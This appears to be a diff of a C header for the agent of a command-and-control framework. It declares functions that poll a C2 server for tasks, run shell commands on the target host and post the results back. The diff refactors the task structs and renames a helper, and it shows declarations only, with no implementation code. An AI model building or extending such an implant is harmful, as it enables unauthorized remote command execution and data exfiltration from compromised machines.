@@ -19,17 +19,17 @@ struct agent_info {
 };
 
 struct strings_array {
-	char *results;
 	char *response; 
 	size_t size;
 };
 
 struct tasks {
 	char id[8];
-	char type[8];
+	int type;
 	char cmd[32];
 	char args[128];
 	char **strings;
+	char *results;
 	size_t sz;
 	size_t cap;
 };
@@ -48,18 +48,18 @@ void create_tasks_url(char *response, struct agent_info *agent);
 // Executes GET request to C2 server to check for tasks. 
 bool check_tasks(struct agent_info *agent, struct strings_array *sa);
 
-// Checks to see if a binary for a provided cmd task exists on the target host.
-bool can_run_cmd(const char *cmd);
-
-// Executes a shell command.
-bool run_cmd(struct strings_array *sa, struct tasks *task);
-
 // Parses task file received from C2 server and assigns values to task struct
 // fields.
 bool parse_tasks(char *response, struct tasks *task);
 
+// Checks to see if a binary for a provided cmd task exists on the target host.
+bool can_run_cmd(const char *cmd);
+
+// Executes a shell command.
+bool run_cmd(struct tasks *task);
+
 // Posts task results to C2 server.
-bool post_results(struct strings_array *sa);
+bool post_results(struct tasks *task);
 
 // Frees memory for task array of strings.
 void destroy(struct tasks *task);
@@ -67,8 +67,8 @@ void destroy(struct tasks *task);
 // Converts data from *char type to FILE type.
 FILE *char_to_file(char * data);
 
-// memsets task struct values.
-void memset_task_vals(struct tasks *task);
+// Sets task struct values to zero.
+void reset_task_vals(struct tasks *task);
 
 
 #endif
